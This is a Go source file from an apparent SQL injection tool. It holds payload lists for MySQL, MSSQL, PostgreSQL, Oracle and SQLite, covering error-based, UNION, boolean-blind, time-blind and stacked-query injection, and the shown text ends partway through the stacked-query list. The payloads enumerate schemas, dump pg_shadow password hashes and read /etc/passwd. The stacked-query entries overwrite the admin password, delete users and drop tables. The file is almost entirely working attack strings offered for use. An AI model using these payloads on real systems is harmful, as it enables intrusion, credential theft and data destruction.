package sqlexp

import "strings"

var errorBasedMySQL = []Payload{
	{Raw: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))-- -", Description: "EXTRACTVALUE报错注入-当前用户", DB: MySQL, Method: ErrorBased},
	{Raw: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)-- -", Description: "UPDATEXML报错注入-当前数据库", DB: MySQL, Method: ErrorBased},
	{Raw: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -", Description: "EXTRACTVALUE报错注入-版本", DB: MySQL, Method: ErrorBased},
	{Raw: "' AND (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)))-- -", Description: "FLOOR-RAND报错注入", DB: MySQL, Method: ErrorBased},
	{Raw: "' AND EXP(~(SELECT * FROM (SELECT user())a))-- -", Description: "EXP报错注入-DoubleQuery", DB: MySQL, Method: ErrorBased},
	{Raw: "' OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0)-- -", Description: "GROUP BY报错注入", DB: MySQL, Method: ErrorBased},
	{Raw: "1' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)-- -", Description: "NAME_CONST报错注入", DB: MySQL, Method: ErrorBased},
	{Raw: "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", Description: "派生表FLOOR报错", DB: MySQL, Method: ErrorBased},
	{Raw: "' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT user())a)b))-- -", Description: "GEOMETRYCOLLECTION报错", DB: MySQL, Method: ErrorBased},
	{Raw: "' AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT user())a)b))-- -", Description: "POLYGON报错注入", DB: MySQL, Method: ErrorBased},
	{Raw: "' AND MULTIPOINT((SELECT * FROM (SELECT * FROM (SELECT user())a)b))-- -", Description: "MULTIPOINT报错注入", DB: MySQL, Method: ErrorBased},
	{Raw: "' AND LINESTRING((SELECT * FROM (SELECT * FROM (SELECT user())a)b))-- -", Description: "LINESTRING报错注入", DB: MySQL, Method: ErrorBased},
	{Raw: "' AND MULTILINESTRING((SELECT * FROM (SELECT * FROM (SELECT user())a)b))-- -", Description: "MULTILINESTRING报错注入", DB: MySQL, Method: ErrorBased},
	{Raw: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- -", Description: "EXTRACTVALUE枚举表名", DB: MySQL, Method: ErrorBased},
	{Raw: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database()),0x7e),1)-- -", Description: "UPDATEXML枚举列名", DB: MySQL, Method: ErrorBased},
	{Raw: "' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a) LIMIT 1-- -", Description: "NAME_CONST LIMIT报错", DB: MySQL, Method: ErrorBased},
	{Raw: "' AND (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(0x7e,FLOOR(RAND(0)*2),0x7e,version()))-- -", Description: "FLOOR-RAND多信息报错", DB: MySQL, Method: ErrorBased},
	{Raw: "1' OR (SELECT EXP(~(SELECT * FROM (SELECT version())a)))-- -", Description: "EXP报错-OR变体", DB: MySQL, Method: ErrorBased},
	{Raw: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e,CAST(USER() AS CHAR)))) FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", Description: "FLOOR直接查询数据", DB: MySQL, Method: ErrorBased},
	{Raw: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT LOAD_FILE('/etc/passwd')),0x7e))-- -", Description: "EXTRACTVALUE读文件报错", DB: MySQL, Method: ErrorBased},
	{Raw: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@datadir),0x7e),1)-- -", Description: "UPDATEXML获取datadir", DB: MySQL, Method: ErrorBased},
}

var errorBasedMSSQL = []Payload{
	{Raw: "' AND 1=CONVERT(int,(SELECT @@version))--", Description: "CONVERT报错注入-版本", DB: MSSQL, Method: ErrorBased},
	{Raw: "' AND 1=CONVERT(int,(SELECT DB_NAME()))--", Description: "CONVERT报错注入-数据库", DB: MSSQL, Method: ErrorBased},
	{Raw: "' AND 1=CONVERT(int,(SELECT SYSTEM_USER))--", Description: "CONVERT报错注入-系统用户", DB: MSSQL, Method: ErrorBased},
	{Raw: "';DBMS_UTILITY.SQL_INJECTION_TO_XML((SELECT @@version))--", Description: "DBMS_UTILITY报错", DB: MSSQL, Method: ErrorBased},
	{Raw: "' AND 1=CONVERT(int,(SELECT HOST_NAME()))--", Description: "CONVERT报错-主机名", DB: MSSQL, Method: ErrorBased},
	{Raw: "' AND 1=CONVERT(int,(SELECT name FROM master..sysdatabases FOR XML PATH))--", Description: "CONVERT报错-所有数据库", DB: MSSQL, Method: ErrorBased},
	{Raw: "' AND 1=CONVERT(int,(SELECT name FROM sysobjects WHERE xtype='U' FOR XML PATH))--", Description: "CONVERT报错-所有表", DB: MSSQL, Method: ErrorBased},
	{Raw: "' AND 1=CONVERT(int,(SELECT name FROM syscolumns WHERE id=OBJECT_ID('users') FOR XML PATH))--", Description: "CONVERT报错-表字段", DB: MSSQL, Method: ErrorBased},
	{Raw: "';DECLARE @s VARCHAR(8000);SET @s=(SELECT CAST(DB_NAME() AS CHAR));DBMS_UTILITY.SQL_INJECTION_TO_XML(@s);--", Description: "DBMS_UTILITY提取数据", DB: MSSQL, Method: ErrorBased},
	{Raw: "' AND 1=CAST((SELECT @@version) AS INT)--", Description: "CAST报错注入-版本", DB: MSSQL, Method: ErrorBased},
	{Raw: "' AND 1=CAST((SELECT DB_NAME()) AS INT)--", Description: "CAST报错注入-数据库", DB: MSSQL, Method: ErrorBased},
}

var errorBasedPostgreSQL = []Payload{
	{Raw: "' AND CAST((SELECT version()) AS INT)-- -", Description: "CAST报错注入-版本", DB: PostgreSQL, Method: ErrorBased},
	{Raw: "' AND CAST((SELECT current_database()) AS INT)-- -", Description: "CAST报错注入-数据库", DB: PostgreSQL, Method: ErrorBased},
	{Raw: "' AND CAST((SELECT current_user) AS INT)-- -", Description: "CAST报错注入-用户", DB: PostgreSQL, Method: ErrorBased},
	{Raw: "' OR CAST((SELECT chr(65)||chr(66)) AS NUMERIC)-- -", Description: "CAST报错字符串拼接", DB: PostgreSQL, Method: ErrorBased},
	{Raw: "' AND CAST((SELECT string_agg(datname,',') FROM pg_database) AS INT)-- -", Description: "CAST报错-所有数据库", DB: PostgreSQL, Method: ErrorBased},
	{Raw: "' AND CAST((SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public') AS INT)-- -", Description: "CAST报错-所有表", DB: PostgreSQL, Method: ErrorBased},
	{Raw: "' AND CAST((SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users') AS INT)-- -", Description: "CAST报错-字段", DB: PostgreSQL, Method: ErrorBased},
	{Raw: "' AND CAST((SELECT CAST('test' AS NUMERIC)) AS INT)-- -", Description: "CAST报错-字符串转NUMERIC", DB: PostgreSQL, Method: ErrorBased},
	{Raw: "' AND CAST((SELECT repeat('a',10000)||version()) AS NUMERIC)-- -", Description: "CAST报错-超长字符串", DB: PostgreSQL, Method: ErrorBased},
}

var errorBasedOracle = []Payload{
	{Raw: "' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--", Description: "CTXSYS报错注入-版本", DB: Oracle, Method: ErrorBased},
	{Raw: "' AND UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--", Description: "UTL_INADDR报错-用户", DB: Oracle, Method: ErrorBased},
	{Raw: "' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--", Description: "UTL_INADDR报错-版本", DB: Oracle, Method: ErrorBased},
	{Raw: "' AND ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT user FROM dual),1,1)--", Description: "ORD_DICOM报错-用户", DB: Oracle, Method: ErrorBased},
	{Raw: "' AND DBMS_XMLQUERY.GETXML((SELECT * FROM (SELECT banner FROM v$version) WHERE ROWNUM=1))--", Description: "DBMS_XMLQUERY报错", DB: Oracle, Method: ErrorBased},
	{Raw: "' AND CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM user_tables WHERE ROWNUM=1))--", Description: "CTXSYS报错-表名", DB: Oracle, Method: ErrorBased},
	{Raw: "' AND UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))--", Description: "UTL_INADDR报错-版本", DB: Oracle, Method: ErrorBased},
	{Raw: "' AND SYS.DBMS_AW_XML.READAWXML('x',(SELECT user FROM dual))--", Description: "DBMS_AW_XML报错", DB: Oracle, Method: ErrorBased},
	{Raw: "' AND ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT banner FROM v$version WHERE ROWNUM=1),1,1)--", Description: "ORD_DICOM报错-版本", DB: Oracle, Method: ErrorBased},
}

var errorBasedSQLite = []Payload{
	{Raw: "' AND (SELECT LOAD_EXTENSION('\\' || (SELECT sqlite_version()) || '.dll'))--", Description: "LOAD_EXTENSION报错-版本", DB: SQLite, Method: ErrorBased},
	{Raw: "' AND (SELECT CASE WHEN (SELECT sqlite_version()) LIKE '3%' THEN ABS(-9223372036854775808) ELSE 0 END)--", Description: "条件报错-版本检测", DB: SQLite, Method: ErrorBased},
	{Raw: "' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM sqlite_master)>0 THEN ABS(-9223372036854775808) ELSE 0 END)--", Description: "条件报错-表存在检测", DB: SQLite, Method: ErrorBased},
	{Raw: "' AND (SELECT CASE WHEN (SELECT tbl_name FROM sqlite_master WHERE type='table' LIMIT 1) LIKE '%' THEN ABS(-9223372036854775808) ELSE 0 END)--", Description: "条件报错-表名提取", DB: SQLite, Method: ErrorBased},
}

var unionBased = []Payload{
	{Raw: "' UNION SELECT NULL-- -", Description: "UNION列数探测-1列", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL-- -", Description: "UNION列数探测-2列", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL,NULL-- -", Description: "UNION列数探测-3列", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL,NULL,NULL-- -", Description: "UNION列数探测-4列", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -", Description: "UNION列数探测-5列", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -", Description: "UNION列数探测-6列", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -", Description: "UNION列数探测-7列", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -", Description: "UNION列数探测-8列", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -", Description: "UNION列数探测-9列", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -", Description: "UNION列数探测-10列", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT @@version,NULL,NULL-- -", Description: "UNION获取版本号", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT database(),NULL,NULL-- -", Description: "UNION获取数据库名", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT user(),NULL,NULL-- -", Description: "UNION获取当前用户", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT GROUP_CONCAT(schema_name),NULL,NULL FROM information_schema.schemata-- -", Description: "UNION获取所有数据库", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -", Description: "UNION获取当前库所有表", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='TABLE'-- -", Description: "UNION获取表的所有列", DB: MySQL, Method: UnionBased},
}

var unionBasedMSSQL = []Payload{
	{Raw: "' UNION SELECT NULL--", Description: "UNION列数探测-1列", DB: MSSQL, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL--", Description: "UNION列数探测-2列", DB: MSSQL, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL,NULL--", Description: "UNION列数探测-3列", DB: MSSQL, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL,NULL,NULL--", Description: "UNION列数探测-4列", DB: MSSQL, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL,NULL,NULL,NULL--", Description: "UNION列数探测-5列", DB: MSSQL, Method: UnionBased},
	{Raw: "' UNION SELECT @@version,NULL,NULL--", Description: "UNION获取版本号", DB: MSSQL, Method: UnionBased},
	{Raw: "' UNION SELECT DB_NAME(),NULL,NULL--", Description: "UNION获取数据库名", DB: MSSQL, Method: UnionBased},
	{Raw: "' UNION SELECT SYSTEM_USER,NULL,NULL--", Description: "UNION获取系统用户", DB: MSSQL, Method: UnionBased},
	{Raw: "' UNION SELECT STRING_AGG(name,','),NULL,NULL FROM master..sysdatabases--", Description: "UNION获取所有数据库", DB: MSSQL, Method: UnionBased},
	{Raw: "' UNION SELECT STRING_AGG(name,','),NULL,NULL FROM sysobjects WHERE xtype='U'--", Description: "UNION获取所有表", DB: MSSQL, Method: UnionBased},
}

var unionBasedPostgreSQL = []Payload{
	{Raw: "' UNION SELECT NULL-- -", Description: "UNION列数探测-1列", DB: PostgreSQL, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL-- -", Description: "UNION列数探测-2列", DB: PostgreSQL, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL,NULL-- -", Description: "UNION列数探测-3列", DB: PostgreSQL, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL,NULL,NULL-- -", Description: "UNION列数探测-4列", DB: PostgreSQL, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -", Description: "UNION列数探测-5列", DB: PostgreSQL, Method: UnionBased},
	{Raw: "' UNION SELECT version(),NULL,NULL-- -", Description: "UNION获取版本号", DB: PostgreSQL, Method: UnionBased},
	{Raw: "' UNION SELECT current_database(),NULL,NULL-- -", Description: "UNION获取数据库名", DB: PostgreSQL, Method: UnionBased},
	{Raw: "' UNION SELECT current_user,NULL,NULL-- -", Description: "UNION获取用户", DB: PostgreSQL, Method: UnionBased},
	{Raw: "' UNION SELECT string_agg(datname,','),NULL,NULL FROM pg_database-- -", Description: "UNION获取所有数据库", DB: PostgreSQL, Method: UnionBased},
	{Raw: "' UNION SELECT string_agg(tablename,','),NULL,NULL FROM pg_tables WHERE schemaname='public'-- -", Description: "UNION获取所有表", DB: PostgreSQL, Method: UnionBased},
	{Raw: "' UNION SELECT string_agg(column_name,','),NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -", Description: "UNION获取列名", DB: PostgreSQL, Method: UnionBased},
	{Raw: "' UNION SELECT usename||':'||passwd,NULL,NULL FROM pg_shadow-- -", Description: "UNION获取用户密码哈希", DB: PostgreSQL, Method: UnionBased},
}

var unionBasedOracle = []Payload{
	{Raw: "' UNION SELECT NULL FROM dual--", Description: "UNION列数探测-1列", DB: Oracle, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL FROM dual--", Description: "UNION列数探测-2列", DB: Oracle, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL,NULL FROM dual--", Description: "UNION列数探测-3列", DB: Oracle, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL,NULL,NULL FROM dual--", Description: "UNION列数探测-4列", DB: Oracle, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL,NULL,NULL,NULL FROM dual--", Description: "UNION列数探测-5列", DB: Oracle, Method: UnionBased},
	{Raw: "' UNION SELECT banner,NULL,NULL FROM v$version WHERE ROWNUM=1--", Description: "UNION获取版本号", DB: Oracle, Method: UnionBased},
	{Raw: "' UNION SELECT user,NULL,NULL FROM dual--", Description: "UNION获取用户", DB: Oracle, Method: UnionBased},
	{Raw: "' UNION SELECT (SELECT global_name FROM global_name),NULL,NULL FROM dual--", Description: "UNION获取数据库名", DB: Oracle, Method: UnionBased},
	{Raw: "' UNION SELECT LISTAGG(table_name,',') WITHIN GROUP(ORDER BY table_name),NULL,NULL FROM all_tables WHERE owner=SYS_CONTEXT('USERENV','CURRENT_SCHEMA')--", Description: "UNION获取所有表", DB: Oracle, Method: UnionBased},
	{Raw: "' UNION SELECT LISTAGG(column_name,',') WITHIN GROUP(ORDER BY column_id),NULL,NULL FROM all_tab_columns WHERE table_name='USERS'--", Description: "UNION获取列名", DB: Oracle, Method: UnionBased},
}

var unionBasedSQLite = []Payload{
	{Raw: "' UNION SELECT NULL--", Description: "UNION列数探测-1列", DB: SQLite, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL--", Description: "UNION列数探测-2列", DB: SQLite, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL,NULL--", Description: "UNION列数探测-3列", DB: SQLite, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL,NULL,NULL--", Description: "UNION列数探测-4列", DB: SQLite, Method: UnionBased},
	{Raw: "' UNION SELECT NULL,NULL,NULL,NULL,NULL--", Description: "UNION列数探测-5列", DB: SQLite, Method: UnionBased},
	{Raw: "' UNION SELECT sqlite_version(),NULL,NULL--", Description: "UNION获取版本号", DB: SQLite, Method: UnionBased},
	{Raw: "' UNION SELECT GROUP_CONCAT(name),NULL,NULL FROM sqlite_master WHERE type='table'--", Description: "UNION获取所有表", DB: SQLite, Method: UnionBased},
	{Raw: "' UNION SELECT GROUP_CONCAT(sql),NULL,NULL FROM sqlite_master WHERE type='table' AND name!='sqlite_sequence'--", Description: "UNION获取建表语句", DB: SQLite, Method: UnionBased},
}

var orderByPayloads = []Payload{
	{Raw: "' ORDER BY 1-- -", Description: "ORDER BY探测-1列", DB: MySQL, Method: UnionBased},
	{Raw: "' ORDER BY 2-- -", Description: "ORDER BY探测-2列", DB: MySQL, Method: UnionBased},
	{Raw: "' ORDER BY 3-- -", Description: "ORDER BY探测-3列", DB: MySQL, Method: UnionBased},
	{Raw: "' ORDER BY 4-- -", Description: "ORDER BY探测-4列", DB: MySQL, Method: UnionBased},
	{Raw: "' ORDER BY 5-- -", Description: "ORDER BY探测-5列", DB: MySQL, Method: UnionBased},
	{Raw: "' ORDER BY 10-- -", Description: "ORDER BY探测-10列", DB: MySQL, Method: UnionBased},
	{Raw: "' ORDER BY 100-- -", Description: "ORDER BY探测-100列", DB: MySQL, Method: UnionBased},
	{Raw: "' ORDER BY 1--", Description: "ORDER BY探测MSSQL-1列", DB: MSSQL, Method: UnionBased},
	{Raw: "' ORDER BY 2--", Description: "ORDER BY探测MSSQL-2列", DB: MSSQL, Method: UnionBased},
	{Raw: "' ORDER BY 20--", Description: "ORDER BY探测MSSQL-20列", DB: MSSQL, Method: UnionBased},
}

var limitPayloads = []Payload{
	{Raw: "' UNION SELECT NULL LIMIT 1 OFFSET 0-- -", Description: "LIMIT分页-第1行", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT NULL LIMIT 1 OFFSET 1-- -", Description: "LIMIT分页-第2行", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT NULL LIMIT 1 OFFSET 10-- -", Description: "LIMIT分页-第11行", DB: MySQL, Method: UnionBased},
	{Raw: "' UNION SELECT NULL LIMIT 1,1-- -", Description: "LIMIT分页-逗号语法", DB: MySQL, Method: UnionBased},
}

var booleanBlind = []Payload{
	{Raw: "' AND '1'='1", Description: "布尔盲注-真条件", DB: MySQL, Method: BooleanBlind},
	{Raw: "' AND '1'='2", Description: "布尔盲注-假条件", DB: MySQL, Method: BooleanBlind},
	{Raw: "' AND 1=1-- -", Description: "布尔盲注-数字真", DB: MySQL, Method: BooleanBlind},
	{Raw: "' AND 1=2-- -", Description: "布尔盲注-数字假", DB: MySQL, Method: BooleanBlind},
	{Raw: "' OR '1'='1", Description: "布尔盲注-OR永真", DB: MySQL, Method: BooleanBlind},
	{Raw: "' AND SUBSTRING((SELECT database()),1,1)='a'-- -", Description: "布尔盲注-数据库名首字母", DB: MySQL, Method: BooleanBlind},
	{Raw: "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64-- -", Description: "布尔盲注-ASCII比较", DB: MySQL, Method: BooleanBlind},
	{Raw: "' AND (SELECT LENGTH(database()))=5-- -", Description: "布尔盲注-数据库名长度", DB: MySQL, Method: BooleanBlind},
	{Raw: "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0-- -", Description: "布尔盲注-表数量判断", DB: MySQL, Method: BooleanBlind},
}

var booleanBlindMSSQL = []Payload{
	{Raw: "' AND '1'='1", Description: "布尔盲注-真条件", DB: MSSQL, Method: BooleanBlind},
	{Raw: "' AND '1'='2", Description: "布尔盲注-假条件", DB: MSSQL, Method: BooleanBlind},
	{Raw: "' AND 1=1--", Description: "布尔盲注-数字真", DB: MSSQL, Method: BooleanBlind},
	{Raw: "' AND SUBSTRING((SELECT DB_NAME()),1,1)='a'--", Description: "布尔盲注-数据库名首字母", DB: MSSQL, Method: BooleanBlind},
	{Raw: "' AND (SELECT LEN(DB_NAME()))=5--", Description: "布尔盲注-数据库名长度", DB: MSSQL, Method: BooleanBlind},
	{Raw: "' AND (SELECT COUNT(*) FROM sysobjects WHERE xtype='U')>0--", Description: "布尔盲注-表存在判断", DB: MSSQL, Method: BooleanBlind},
	{Raw: "' AND (SELECT TOP 1 name FROM sysobjects WHERE xtype='U')!=''--", Description: "布尔盲注-首表名判断", DB: MSSQL, Method: BooleanBlind},
}

var booleanBlindPostgreSQL = []Payload{
	{Raw: "' AND '1'='1", Description: "布尔盲注-真条件", DB: PostgreSQL, Method: BooleanBlind},
	{Raw: "' AND '1'='2", Description: "布尔盲注-假条件", DB: PostgreSQL, Method: BooleanBlind},
	{Raw: "' AND 1=1-- -", Description: "布尔盲注-数字真", DB: PostgreSQL, Method: BooleanBlind},
	{Raw: "' AND SUBSTR((SELECT current_database()),1,1)='a'-- -", Description: "布尔盲注-数据库名首字母", DB: PostgreSQL, Method: BooleanBlind},
	{Raw: "' AND (SELECT LENGTH(current_database()))=5-- -", Description: "布尔盲注-数据库名长度", DB: PostgreSQL, Method: BooleanBlind},
	{Raw: "' AND (SELECT COUNT(*) FROM pg_tables WHERE schemaname='public')>0-- -", Description: "布尔盲注-表数量判断", DB: PostgreSQL, Method: BooleanBlind},
	{Raw: "' AND (SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1)!=''-- -", Description: "布尔盲注-首表名判断", DB: PostgreSQL, Method: BooleanBlind},
}

var booleanBlindOracle = []Payload{
	{Raw: "' AND '1'='1", Description: "布尔盲注-真条件", DB: Oracle, Method: BooleanBlind},
	{Raw: "' AND '1'='2", Description: "布尔盲注-假条件", DB: Oracle, Method: BooleanBlind},
	{Raw: "' AND 1=1--", Description: "布尔盲注-数字真", DB: Oracle, Method: BooleanBlind},
	{Raw: "' AND SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1)='O'--", Description: "布尔盲注-版本检测", DB: Oracle, Method: BooleanBlind},
	{Raw: "' AND (SELECT LENGTH(user) FROM dual)=5--", Description: "布尔盲注-用户名长度", DB: Oracle, Method: BooleanBlind},
	{Raw: "' AND (SELECT COUNT(*) FROM all_tables WHERE owner=SYS_CONTEXT('USERENV','CURRENT_SCHEMA'))>0--", Description: "布尔盲注-表数量判断", DB: Oracle, Method: BooleanBlind},
}

var booleanBlindSQLite = []Payload{
	{Raw: "' AND '1'='1", Description: "布尔盲注-真条件", DB: SQLite, Method: BooleanBlind},
	{Raw: "' AND '1'='2", Description: "布尔盲注-假条件", DB: SQLite, Method: BooleanBlind},
	{Raw: "' AND 1=1--", Description: "布尔盲注-数字真", DB: SQLite, Method: BooleanBlind},
	{Raw: "' AND SUBSTR((SELECT sqlite_version()),1,1)='3'--", Description: "布尔盲注-版本检测", DB: SQLite, Method: BooleanBlind},
	{Raw: "' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0--", Description: "布尔盲注-表存在判断", DB: SQLite, Method: BooleanBlind},
}

var timeBlindMySQL = []Payload{
	{Raw: "' AND SLEEP(5)-- -", Description: "延时盲注-SLEEP 5秒", DB: MySQL, Method: TimeBlind},
	{Raw: "' AND IF(1=1,SLEEP(5),0)-- -", Description: "延时盲注-IF条件", DB: MySQL, Method: TimeBlind},
	{Raw: "' AND (SELECT SLEEP(5))-- -", Description: "延时盲注-SELECT SLEEP", DB: MySQL, Method: TimeBlind},
	{Raw: "' AND BENCHMARK(5000000,MD5(1))-- -", Description: "延时盲注-BENCHMARK", DB: MySQL, Method: TimeBlind},
	{Raw: "' OR SLEEP(5)-- -", Description: "延时盲注-OR SLEEP", DB: MySQL, Method: TimeBlind},
	{Raw: "' AND IF(SUBSTRING((SELECT database()),1,1)='a',SLEEP(5),0)-- -", Description: "延时盲注-数据提取", DB: MySQL, Method: TimeBlind},
	{Raw: "' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>64,SLEEP(5),0)-- -", Description: "延时盲注-ASCII提取", DB: MySQL, Method: TimeBlind},
	{Raw: "' AND BENCHMARK(10000000,MD5('A'))-- -", Description: "延时盲注-BENCHMARK大数值", DB: MySQL, Method: TimeBlind},
	{Raw: "' AND (SELECT COUNT(*) FROM information_schema.tables A,information_schema.tables B,information_schema.tables C)-- -", Description: "延时盲注-笛卡尔积", DB: MySQL, Method: TimeBlind},
	{Raw: "' AND GET_LOCK('sqli_test',5)-- -", Description: "延时盲注-GET_LOCK", DB: MySQL, Method: TimeBlind},
	{Raw: "' AND RLIKE(REPEAT('(a.*)+',30),REPEAT('a',100))-- -", Description: "延时盲注-ReDoS正则", DB: MySQL, Method: TimeBlind},
}

var timeBlindPostgreSQL = []Payload{
	{Raw: "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -", Description: "延时盲注-pg_sleep 5秒", DB: PostgreSQL, Method: TimeBlind},
	{Raw: "' OR pg_sleep(5)-- -", Description: "延时盲注-OR pg_sleep", DB: PostgreSQL, Method: TimeBlind},
	{Raw: "' AND (SELECT CASE WHEN (current_database() LIKE 'a%') THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -", Description: "延时盲注-数据库名提取", DB: PostgreSQL, Method: TimeBlind},
	{Raw: "' AND (SELECT COUNT(*) FROM generate_series(1,100000000))>0-- -", Description: "延时盲注-generate_series", DB: PostgreSQL, Method: TimeBlind},
	{Raw: "' AND (SELECT pg_sleep(5) FROM pg_database LIMIT 1)-- -", Description: "延时盲注-pg_sleep多行", DB: PostgreSQL, Method: TimeBlind},
}

var timeBlindMSSQL = []Payload{
	{Raw: "';WAITFOR DELAY '0:0:5'--", Description: "延时盲注-WAITFOR 5秒", DB: MSSQL, Method: TimeBlind},
	{Raw: "' IF(1=1) WAITFOR DELAY '0:0:5'--", Description: "延时盲注-条件WAITFOR", DB: MSSQL, Method: TimeBlind},
	{Raw: "';WAITFOR DELAY '0:0:5';SELECT 1--", Description: "延时盲注-堆叠WAITFOR", DB: MSSQL, Method: TimeBlind},
	{Raw: "';WAITFOR DELAY '0:0:0:5'--", Description: "延时盲注-WAITFOR 毫秒", DB: MSSQL, Method: TimeBlind},
}

var timeBlindOracle = []Payload{
	{Raw: "' AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM dual)--", Description: "延时盲注-DBMS_LOCK 5秒", DB: Oracle, Method: TimeBlind},
	{Raw: "' OR DBMS_LOCK.SLEEP(5) IS NULL--", Description: "延时盲注-OR DBMS_LOCK", DB: Oracle, Method: TimeBlind},
	{Raw: "' AND (SELECT COUNT(*) FROM all_objects WHERE DBMS_LOCK.SLEEP(5)=1)>0--", Description: "延时盲注-计数延时", DB: Oracle, Method: TimeBlind},
}

var timeBlindSQLite = []Payload{
	{Raw: "' AND (SELECT LIKE('abcdefg',UPPER(HEX(RANDOMBLOB(500000000/2)))))--", Description: "延时盲注-HEAVY运算", DB: SQLite, Method: TimeBlind},
	{Raw: "' AND (SELECT CASE WHEN (1=1) THEN RANDOMBLOB(300000000) ELSE 0 END)--", Description: "延时盲注-条件HEAVY", DB: SQLite, Method: TimeBlind},
}

var stackedQueries = []Payload{
	{Raw: "';INSERT INTO users VALUES('hack','pass');-- -", Description: "堆叠注入-INSERT", DB: MySQL, Method: StackedQuery},
	{Raw: "';UPDATE users SET password='hack' WHERE username='admin';-- -", Description: "堆叠注入-UPDATE", DB: MySQL, Method: StackedQuery},
	{Raw: "';DELETE FROM users WHERE username='admin';-- -", Description: "堆叠注入-DELETE", DB: MySQL, Method: StackedQuery},
	{Raw: "';DROP TABLE users;-- -", Description: "堆叠注入-DROP TABLE", DB: MySQL, Method: StackedQuery},
	{Raw: "';SELECT LOAD_FILE('/etc/passwd');-- -", Description: "堆叠注入-读文件", DB: MySQL, Method: StackedQuery},
